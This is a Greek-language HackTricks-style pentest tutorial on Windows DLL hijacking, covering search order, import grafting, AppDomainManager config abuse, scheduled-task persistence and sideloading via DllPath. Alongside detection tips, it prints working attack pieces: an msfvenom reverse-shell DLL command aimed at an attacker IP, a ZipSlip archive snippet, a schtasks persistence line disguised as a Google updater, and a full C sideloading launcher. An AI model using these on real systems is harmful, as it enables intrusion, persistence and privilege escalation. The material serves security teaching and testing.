# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Το DLL Hijacking περιλαμβάνει την παραπλάνηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος καλύπτει διάφορες τακτικές, όπως **DLL Spoofing, Injection και Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα και επίτευξη persistence και, λιγότερο συχνά, για κλιμάκωση προνομίων. Παρότι εδώ η έμφαση δίνεται στην κλιμάκωση, η μέθοδος hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Συνήθεις τεχνικές

Για το DLL hijacking χρησιμοποιούνται διάφορες μέθοδοι, καθεμία με διαφορετική αποτελεσματικότητα ανάλογα με τον τρόπο με τον οποίο η εφαρμογή φορτώνει τα DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Αντικατάσταση ενός αυθεντικού DLL με ένα κακόβουλο, με προαιρετική χρήση DLL Proxying για διατήρηση της λειτουργικότητας του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε διαδρομή αναζήτησης πριν από τη νόμιμη, αξιοποιώντας τη σειρά αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL που θα φορτώσει η εφαρμογή, θεωρώντας ότι πρόκειται για ένα απαιτούμενο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το `%PATH%` ή αρχείων `.exe.manifest` / `.exe.local`, ώστε η εφαρμογή να κατευθυνθεί στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίγραφό του στον κατάλογο WinSxS, μέθοδος που συχνά σχετίζεται με το DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε κατάλογο που ελέγχει ο χρήστης, μαζί με το αντιγραμμένο πρόγραμμα, με τρόπο που θυμίζει τεχνικές Binary Proxy Execution.

Μια εφαρμογή μπορεί επίσης να υλοποιεί τον **δικό της DLL loader**. Μια προνομιούχα διεργασία μπορεί να απαριθμεί έναν υποκατάλογο, όπως `Libraries` ή `Plugins`, και να παραδίδει ένα επιλεγμένο DLL σε μια βοηθητική διεργασία, ανεξάρτητα από τη συνήθη σειρά αναζήτησης DLL των Windows. Αν άλλος λογαριασμός μπορεί να δημιουργεί αρχεία σε αυτόν ακριβώς τον κατάλογο, θεωρήστε το αφορμή για περαιτέρω έλεγχο: επιβεβαιώστε την ταυτότητα της διεργασίας, τα ενεργά ACL του καταλόγου, τον κανόνα επιλογής αρχείων και αν είναι δυνατή η φόρτωση. Το ότι ένας κατάλογος εγγράψιμος από τον χρήστη βρίσκεται δίπλα σε ένα εκτελέσιμο δεν αποδεικνύει ότι η διεργασία φορτώνει DLL από εκεί.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Στο κλασικό side-loading, το έμπιστο PE παραμένει αμετάβλητο και η επίθεση εκμεταλλεύεται την επίλυση ονομάτων DLL. Αντίθετα, το **import grafting** τροποποιεί ένα PE που έχει ήδη φορτωθεί από το έμπιστο πρόγραμμα. Ο επιτιθέμενος προσθέτει έναν import descriptor και τις αντίστοιχες εγγραφές lookup/IAT για ένα DLL που ελέγχει. Όταν τα Windows επιλύουν αναδρομικά αυτήν την εξάρτηση, φορτώνουν το πρόσθετο DLL και εκτελούν τον κώδικα αρχικοποίησής του μέσα στη διεργασία που κατά τα άλλα είναι νόμιμη. Πρόκειται για τροποποίηση PE στον δίσκο και όχι για αντικατάσταση ενός δείκτη συνάρτησης IAT κατά την εκτέλεση με runtime hook.<sup>[[31]](#references)[[32]](#references)</sup>

Το τροποποιημένο PE μπορεί να είναι ένα ενδιάμεσο DLL προμηθευτή και όχι το εκτελέσιμο που εκκινεί ο χρήστης ή το Task Scheduler. Μια αλυσίδα που μπορεί να επαναχρησιμοποιηθεί είναι η εξής:<sup>[[32]](#references)</sup>

1. Αντιγράψτε το νόμιμο εκτελέσιμο και τις εξαρτήσεις του σε έναν κατάλογο που ελέγχει ο επιτιθέμενος.
2. Τροποποιήστε τις δομές import μιας εξάρτησης ώστε να αναφέρονται στο κακόβουλο DLL, διατηρώντας παράλληλα τα αναμενόμενα exports της εξάρτησης και τη συνήθη συμπεριφορά της.
3. Ρυθμίστε ένα autorun ή μια προγραμματισμένη εργασία ώστε να εκκινεί το νόμιμο εκτελέσιμο. Ο loader φορτώνει την τροποποιημένη εξάρτηση και έπειτα το DLL που εισήχθη. Για απαρίθμηση εργασιών, δείτε το [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks).
4. Μην εκτελείτε χρονοβόρες εργασίες στο `DllMain`· ο loader που παρατηρήθηκε δημιούργησε ένα worker thread και συνέχισε εκεί την αποκρυπτογράφηση του σταδίου.

Αυτό διαφέρει από την παραβίαση της εφοδιαστικής αλυσίδας στην πλευρά του προμηθευτή, όταν το πακέτο του προμηθευτή είναι καθαρό και η τροποποίηση των imports γίνεται μετά την εγκατάσταση. Ελέγξτε κάθε module στον κατάλογο που χρησιμοποιείται για την επίθεση, όχι μόνο το host EXE: συγκρίνετε τις λίστες imports και τα hashes των εξαρτήσεων με μια γνωστή καλή εγκατάσταση, επαληθεύστε τις υπογραφές και διερευνήστε εκτελέσιμα του προμηθευτή που εκκινούνται από απροσδόκητες εγγράψιμες τοποθεσίες, όπως το `C:\ProgramData`. Μια προγραμματισμένη εργασία που δείχνει σε ένα αντιγραμμένο crash reporter ή updater σε τέτοιον κατάλογο αποτελεί ιδιαίτερα χρήσιμο σημείο διερεύνησης.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να φορτωθεί κώδικας του επιτιθέμενου από μια έμπιστη διεργασία **.NET Framework**. Αν το εκτελέσιμο-στόχος είναι **managed** εφαρμογή, το CLR ελέγχει επίσης ένα **αρχείο ρυθμίσεων εφαρμογής** με όνομα που βασίζεται στο εκτελέσιμο (για παράδειγμα, `Setup.exe.config`). Σε αυτό το αρχείο μπορεί να οριστεί ένα προσαρμοσμένο **AppDomainManager**. Αν η ρύθμιση παραπέμπει σε ένα assembly που ελέγχει ο επιτιθέμενος και βρίσκεται δίπλα στο EXE, το CLR το φορτώνει **πριν από τη συνήθη διαδρομή εκτέλεσης της εφαρμογής** και εκτελείται μέσα στην έμπιστη διεργασία.<sup>[[24]](#references)</sup>

Σύμφωνα με το σχήμα ρυθμίσεων του .NET Framework της Microsoft, πρέπει να υπάρχουν τόσο τα `<appDomainManagerAssembly>` όσο και τα `<appDomainManagerType>` για να χρησιμοποιηθεί ο προσαρμοσμένος manager.<sup>[[16]](#references)[[17]](#references)</sup>

Ελάχιστη ρύθμιση:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Ελάχιστος διαχειριστής:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Πρακτικές σημειώσεις:
- Αυτή η τεχνική αφορά **ειδικά το .NET Framework**. Βασίζεται στην ανάλυση των ρυθμίσεων του CLR και όχι στη σειρά αναζήτησης DLL του Win32.
- Ο host πρέπει να είναι πράγματι **managed EXE**. Γρήγορος έλεγχος: `sigcheck -m target.exe`, `corflags target.exe` ή αναζήτηση της **CLR Runtime Header** στα μεταδεδομένα PE.
- Το όνομα του αρχείου ρυθμίσεων πρέπει να ταιριάζει ακριβώς με το όνομα του εκτελέσιμου (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **υπογεγραμμένα binaries της Microsoft/προμηθευτών**, επειδή το έμπιστο EXE παραμένει ανέπαφο, ενώ το κακόβουλο managed assembly εκτελείται εντός της διεργασίας.
- Αν έχετε ήδη έναν εγγράψιμο κατάλογο εγκατάστασης/ενημέρωσης, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως **πρώτο στάδιο**, και στη συνέχεια να ακολουθήσει κλασικό DLL sideloading ή reflective loading για τα επόμενα στάδια.

### Το AppDomainManager ως downloader + bootstrap για scheduled task

Ένα πρακτικό μοτίβο εισβολής είναι ο συνδυασμός του έμπιστου managed EXE με ένα κακόβουλο `*.config` και ένα κακόβουλο AppDomainManager DLL που λειτουργεί μόνο ως **μικρός bootstrapper**:<sup>[[25]](#references)</sup>

1. Ο χρήστης εκκινεί ένα υπογεγραμμένο .NET installer ή updater από μια εύλογη τοποθεσία, όπως το `%USERPROFILE%\Downloads`.
2. Το παρακείμενο config κάνει το CLR να φορτώσει το assembly του επιτιθέμενου **πριν ξεκινήσει η νόμιμη λογική της εφαρμογής**.
3. Ο κακόβουλος manager εκτελεί έναν **έλεγχο διαδρομής** (για παράδειγμα, συνεχίζει μόνο αν το host EXE εκτελείται από το `Downloads` και επιτρέπει στο δεύτερο στάδιο να εκτελεστεί μόνο από το `%LOCALAPPDATA%`).
4. Αν ο έλεγχος περάσει, κατεβάζει το πραγματικό payload σε μια διαδρομή εγγράψιμη από τον χρήστη, όπως `%LOCALAPPDATA%\PerfWatson2.exe`, και εγκαθιστά persistence με ένα scheduled task.

Γιατί έχει σημασία αυτή η παραλλαγή:
- Το υπογεγραμμένο host EXE παραμένει αμετάβλητο, επομένως η διαλογή που ελέγχει μόνο τα hashes του κύριου binary μπορεί να μην εντοπίσει την παραβίαση.
- Η απλή **αντι-ανάλυση βάσει διαδρομής** είναι συνηθισμένη: η μεταφορά της τριάδας ZIP/EXE/DLL στην επιφάνεια εργασίας, στο Temp ή σε μια διαδρομή sandbox μπορεί να διακόψει σκόπιμα την αλυσίδα.
- Το AppDomainManager DLL του πρώτου σταδίου μπορεί να παραμείνει μικρό και χαμηλού θορύβου, ενώ το πραγματικό implant λαμβάνεται αργότερα.

Ελάχιστο παράδειγμα persistence που συναντάται συχνά με αυτό το μοτίβο:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Σημειώσεις:
- Το ` /rl highest` σημαίνει **το υψηλότερο διαθέσιμο επίπεδο** για τον συγκεκριμένο χρήστη/συνεδρία· από μόνο του δεν εγγυάται κλιμάκωση σε SYSTEM.
- Αυτή η τεχνική κατατάσσεται συχνά καλύτερα ως **εκτέλεση/εμμονή μέσω κατάχρησης ρυθμίσεων .NET** παρά ως κλασική κατάχρηση της σειράς αναζήτησης για ελλείπουσα DLL, παρόλο που οι χειριστές συχνά συνδυάζουν και τις δύο τεχνικές.

Σημεία ανίχνευσης:
- Υπογεγραμμένα εκτελέσιμα .NET που εκκινούνται από διαδρομές εξαγωγής ZIP, τον φάκελο `Downloads`, τον `%TEMP%` ή άλλους φακέλους στους οποίους μπορεί να γράψει ο χρήστης, και έχουν δίπλα τους ένα `<exe>.config`.
- Νέες προγραμματισμένες εργασίες των οποίων η ενέργεια δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%` ή `Downloads` και τα ονόματά τους μιμούνται ενημερωτές προγραμμάτων περιήγησης ή προμηθευτών.
- Βραχύβιες διαχειριζόμενες διεργασίες bootstrap που κατεβάζουν αμέσως ένα άλλο EXE και έπειτα εκκινούν το `schtasks.exe`.
- Δείγματα που τερματίζονται πρόωρα, εκτός αν η διαδρομή του εκτελέσιμου αρχείου αντιστοιχεί σε έναν αναμενόμενο κατάλογο προφίλ χρήστη.

### Κατάχρηση υπάρχουσας προγραμματισμένης εργασίας για επανεκκίνηση της αλυσίδας sideload

Για λόγους εμμονής, μην αναζητάτε μόνο **τη δημιουργία νέας εργασίας**. Ορισμένες ομάδες εισβολέων περιμένουν να δημιουργήσει ένας νόμιμος εγκαταστάτης μια **κανονική εργασία ενημέρωσης** και έπειτα **τροποποιούν την ενέργεια της εργασίας**, ώστε το υπάρχον όνομα, ο συντάκτης και το έναυσμα να παραμένουν οικεία στους αμυνόμενους.

Επαναχρησιμοποιήσιμη ροή εργασίας:
1. Εγκαταστήστε/εκτελέστε το νόμιμο λογισμικό και εντοπίστε την εργασία που δημιουργεί συνήθως.
2. Εξαγάγετε το XML της εργασίας και σημειώστε τις τρέχουσες τιμές των `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Αντικαταστήστε μόνο την ενέργεια, ώστε η εργασία να εκκινεί το **έμπιστο EXE-ξενιστή** από έναν προσωρινό κατάλογο στον οποίο μπορεί να γράψει ο χρήστης· στη συνέχεια, αυτό φορτώνει παράπλευρα ή μέσω AppDomain το πραγματικό payload.
4. Καταχωρίστε ξανά την εργασία με το ίδιο όνομα, αντί να δημιουργήσετε ένα νέο, προφανές τεχνούργημα εμμονής.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Γιατί είναι πιο stealth:
- Το όνομα της εργασίας μπορεί να φαίνεται νόμιμο (για παράδειγμα, ένα πρόγραμμα ενημέρωσης προμηθευτή).
- Το εκκινεί η **υπηρεσία Task Scheduler**, επομένως η επικύρωση γονικής διεργασίας/προγόνων συχνά εντοπίζει την αναμενόμενη αλυσίδα προγραμματισμού αντί για το `explorer.exe`.
- Οι ομάδες DFIR που αναζητούν μόνο **νέα ονόματα εργασιών** μπορεί να παραβλέψουν μια εργασία της οποίας η καταχώριση προϋπήρχε, αλλά η ενέργειά της δείχνει πλέον στο `%LOCALAPPDATA%`, στο `%APPDATA%` ή σε άλλη διαδρομή που ελέγχει ο επιτιθέμενος.

Γρήγορα σημεία ελέγχου:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Συγκρίνετε τα XML των `C:\Windows\System32\Tasks\*` και τα μεταδεδομένα του `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` με μια baseline.
- Δημιουργήστε alert όταν μια **εργασία ενημέρωσης που φαίνεται να ανήκει σε προμηθευτή** εκτελείται από **καταλόγους με δυνατότητα εγγραφής από χρήστες** ή εκκινεί ένα .NET EXE με ένα γειτονικό αρχείο `*.config`.

> [!TIP]
> Για μια αλυσίδα βήμα προς βήμα που συνδυάζει HTML staging, configs AES-CTR και .NET implants με DLL sideloading, δείτε την παρακάτω ροή εργασίας.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Σύνδεση ενός side-loaded stage με τη γραμμή εντολών της υπηρεσίας

Ένα side-loaded DLL μπορεί να απαιτεί κάτι περισσότερο από το αναμενόμενο host EXE και το όνομα του DLL. Η Mandiant περιέγραψε έναν loader που συνδέει την αποκρυπτογράφηση του payload με ένα όρισμα γραμμής εντολών και το όνομα του εκτελέσιμου αρχείου host.<sup>[[33]](#references)</sup> Σε μια μεταγενέστερη αλυσίδα που βασιζόταν σε υπηρεσία, ένα αντίγραφο νόμιμου host φόρτωνε ένα γειτονικό `mscoree.dll`, το οποίο εξήγαγε το `LockClrVersion` και αποκρυπτογραφούσε το ενσωματωμένο stage μόνο αφού παρήγαγε ένα κλειδί AES-128 από το όρισμα της υπηρεσίας και το basename του εκτελέσιμου αρχείου host. Κάθε είσοδος περικοπτόταν ή συμπληρωνόταν με NUL στα 16 bytes· το κλειδί ανά byte ήταν `argument XOR embedded_key XOR executable_basename`, και έπειτα το payload αποκρυπτογραφούνταν με AES-CBC χωρίς padding. Η μετονομασία του host ή η εκκίνησή του χωρίς το αναμενόμενο όρισμα αλλάζει το κλειδί και εμποδίζει την αποκρυπτογράφηση αυτού του stage, ακόμη κι αν φορτώνεται το DLL. Κατά την αναπαραγωγή ή ανάλυση αυτής της παραλλαγής, διατηρήστε ακριβώς το όρισμα της γραμμής εντολών και το basename.<sup>[[34]](#references)</sup>

Πρόκειται για **έλεγχο του payload που προστίθεται στο συνηθισμένο DLL side-loading**, όχι για νέο κανόνα σειράς αναζήτησης DLL ή για primitive κλιμάκωσης προνομίων από μόνο του. Το security context της υπηρεσίας καθορίζει το επίπεδο προνομίων που προκύπτει. Η ροή εργασίας [GitHub issue/file C2](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) τεκμηριώνει ξεχωριστά τη μεταγενέστερη μεταφορά.<sup>[[34]](#references)</sup>

## Εντοπισμός DLL που λείπουν

Ο πιο συνηθισμένος τρόπος εντοπισμού DLL που λείπουν από ένα σύστημα είναι η εκτέλεση του [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από το Sysinternals και ο **ορισμός των ακόλουθων 2 φίλτρων**:

![Κοινές τεχνικές - Εντοπισμός DLL που λείπουν: Ο πιο συνηθισμένος τρόπος εντοπισμού DLL που λείπουν από ένα σύστημα είναι η εκτέλεση του procmon από το Sysinternals και ο ορισμός των ακόλουθων 2 φίλτρων](<../../../images/image (961).png>)

![Κοινές τεχνικές - Εντοπισμός DLL που λείπουν: Ο πιο συνηθισμένος τρόπος εντοπισμού DLL που λείπουν από ένα σύστημα είναι η εκτέλεση του procmon από το Sysinternals και ο ορισμός των ακόλουθων 2 φίλτρων](<../../../images/image (230).png>)

και να εμφανίσετε μόνο τη **Δραστηριότητα συστήματος αρχείων**:

![Κοινές τεχνικές - Εντοπισμός DLL που λείπουν: και να εμφανίσετε μόνο τη Δραστηριότητα συστήματος αρχείων](<../../../images/image (153).png>)

Αν αναζητάτε **DLL που λείπουν γενικά**, **αφήστε** το να εκτελείται για μερικά **δευτερόλεπτα**.\
Αν αναζητάτε ένα **DLL που λείπει από συγκεκριμένο εκτελέσιμο αρχείο**, ορίστε ένα ακόμη φίλτρο, όπως **"Process Name" "contains" `<exec name>`**, εκτελέστε το και σταματήστε την καταγραφή συμβάντων.<sup>[[9]](#references)</sup>

## Εκμετάλλευση DLL που λείπουν

Για να κλιμακώσετε προνόμια, αναζητήστε ένα **DLL που μια προνομιούχα διεργασία προσπαθεί να φορτώσει** από τοποθεσία στην οποία μπορείτε να γράψετε. Αυτό μπορεί να συμβεί όταν ελέγχετε έναν κατάλογο που αναζητείται πριν από τον κατάλογο που περιέχει το νόμιμο DLL ή όταν το DLL που ζητείται δεν υπάρχει και μπορείτε να γράψετε σε έναν από τους καταλόγους που αναζητούνται.

### Σειρά αναζήτησης DLL

**Στην** [**τεκμηρίωση της Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε λεπτομέρειες για τον τρόπο φόρτωσης των DLL.**

Οι **εφαρμογές Windows** αναζητούν DLL ακολουθώντας ένα σύνολο **προκαθορισμένων διαδρομών αναζήτησης**, με συγκεκριμένη σειρά. Το DLL hijacking συμβαίνει όταν τοποθετείται στρατηγικά ένα κακόβουλο DLL σε έναν από αυτούς τους καταλόγους, ώστε να φορτωθεί πριν από το αυθεντικό DLL. Ένας τρόπος αποτροπής είναι να διασφαλίσετε ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στα DLL που χρειάζεται.

Παρακάτω παρουσιάζεται η **σειρά αναζήτησης DLL σε συστήματα 32-bit**:

1. Ο κατάλογος από τον οποίο φορτώθηκε η εφαρμογή.
2. Ο κατάλογος συστήματος. Χρησιμοποιήστε τη συνάρτηση [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να λάβετε τη διαδρομή αυτού του καταλόγου.(_C:\Windows\System32_)
3. Ο κατάλογος συστήματος 16-bit. Δεν υπάρχει συνάρτηση για τη λήψη της διαδρομής αυτού του καταλόγου, αλλά αυτός αναζητείται. (_C:\Windows\System_)
4. Ο κατάλογος Windows. Χρησιμοποιήστε τη συνάρτηση [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να λάβετε τη διαδρομή αυτού του καταλόγου.
   1. (_C:\Windows_)
5. Ο τρέχων κατάλογος.
6. Οι κατάλογοι που αναφέρονται στη μεταβλητή περιβάλλοντος PATH. Σημειώστε ότι αυτό δεν περιλαμβάνει τη διαδρομή ανά εφαρμογή που καθορίζεται από το κλειδί μητρώου **App Paths**. Το κλειδί **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό της διαδρομής αναζήτησης DLL.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτήν τη λειτουργία, δημιουργήστε την τιμή μητρώου **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (από προεπιλογή είναι ενεργοποιημένη).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά από τον κατάλογο της εκτελέσιμης μονάδας που φορτώνει η **LoadLibraryEx**.

Τέλος, ένα DLL μπορεί να φορτωθεί μέσω απόλυτης διαδρομής αντί για όνομα. Σε αυτήν την περίπτωση, τα Windows αναζητούν το ίδιο το DLL μόνο σε αυτήν τη διαδρομή· οι εξαρτήσεις που ζητούνται με βάση το όνομα εξακολουθούν να ακολουθούν την ισχύουσα σειρά αναζήτησης.

Υπάρχουν και άλλοι τρόποι αλλαγής της σειράς αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

### Αλυσιδωτή αξιοποίηση αυθαίρετης εγγραφής αρχείων για DLL hijack λόγω DLL που λείπει

**Σχετική τεχνική:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Χρησιμοποιήστε φίλτρα **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξετε τα ονόματα DLL που ελέγχει η διεργασία αλλά δεν βρίσκει.<sup>[[14]](#references)</sup>
2. Αν το binary εκτελείται **προγραμματισμένα ή ως υπηρεσία**, η τοποθέτηση ενός DLL με ένα από αυτά τα ονόματα στον **κατάλογο της εφαρμογής** (θέση #1 στη σειρά αναζήτησης) θα έχει ως αποτέλεσμα να φορτωθεί στην επόμενη εκτέλεση. Σε μία περίπτωση .NET scanner, η διεργασία αναζητούσε το `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το πραγματικό αντίγραφο από το `C:\Program Files\dotnet\fxr\...`.
3. Δημιουργήστε ένα payload DLL (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν το primitive σας είναι **αυθαίρετη εγγραφή τύπου ZipSlip**, δημιουργήστε ένα ZIP του οποίου η καταχώριση διαφεύγει από τον κατάλογο εξαγωγής, ώστε το DLL να καταλήξει στον φάκελο της εφαρμογής:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Παραδώστε το archive στο inbox/share που παρακολουθείται· όταν η προγραμματισμένη εργασία επανεκκινήσει τη διεργασία, αυτή φορτώνει το κακόβουλο DLL και εκτελεί τον κώδικά σας ως λογαριασμός υπηρεσίας.

### Εξαναγκασμός sideloading μέσω του RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε με ντετερμινιστικό τρόπο τη διαδρομή αναζήτησης DLL μιας νέας διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας με τα native APIs του ntdll. Παρέχοντας εδώ έναν κατάλογο που ελέγχετε, μπορείτε να αναγκάσετε μια διεργασία-στόχο που επιλύει ένα εισαγόμενο DLL βάσει ονόματος (χωρίς απόλυτη διαδρομή και χωρίς χρήση των safe loading flags) να φορτώσει ένα κακόβουλο DLL από αυτόν τον κατάλογο.

Βασική ιδέα
- Δημιουργήστε τις παραμέτρους της διεργασίας με το RtlCreateProcessParametersEx και ορίστε ένα προσαρμοσμένο DllPath που δείχνει στον φάκελο που ελέγχετε (π.χ. στον κατάλογο όπου βρίσκεται το dropper/unpacker σας).
- Δημιουργήστε τη διεργασία με το RtlCreateUserProcess. Όταν το binary-στόχος επιλύει ένα DLL βάσει ονόματος, ο loader θα συμβουλευτεί το DllPath που δώσατε κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμη και όταν το κακόβουλο DLL δεν βρίσκεται στον ίδιο κατάλογο με το EXE-στόχο.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη θυγατρική διεργασία που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την τρέχουσα διεργασία.
- Ο στόχος πρέπει να εισάγει ένα DLL ή να χρησιμοποιεί LoadLibrary για φόρτωση DLL βάσει ονόματος (χωρίς απόλυτη διαδρομή και χωρίς χρήση των LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και οι hardcoded απόλυτες διαδρομές δεν μπορούν να παραβιαστούν. Τα forwarded exports και το SxS ενδέχεται να αλλάξουν τη σειρά προτεραιότητας.

Ελάχιστο παράδειγμα C (ntdll, wide strings, απλοποιημένος χειρισμός σφαλμάτων):

<details>
<summary>Πλήρες παράδειγμα C: εξαναγκασμός DLL sideloading μέσω του RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Παράδειγμα λειτουργικής χρήσης
- Τοποθετήστε ένα κακόβουλο xmllite.dll (που εξάγει τις απαιτούμενες συναρτήσεις ή λειτουργεί ως proxy προς την πραγματική) στον κατάλογο DllPath.
- Εκκινήστε ένα υπογεγραμμένο binary που είναι γνωστό ότι αναζητά το xmllite.dll με βάση το όνομα, χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και κάνει sideload το DLL σας.

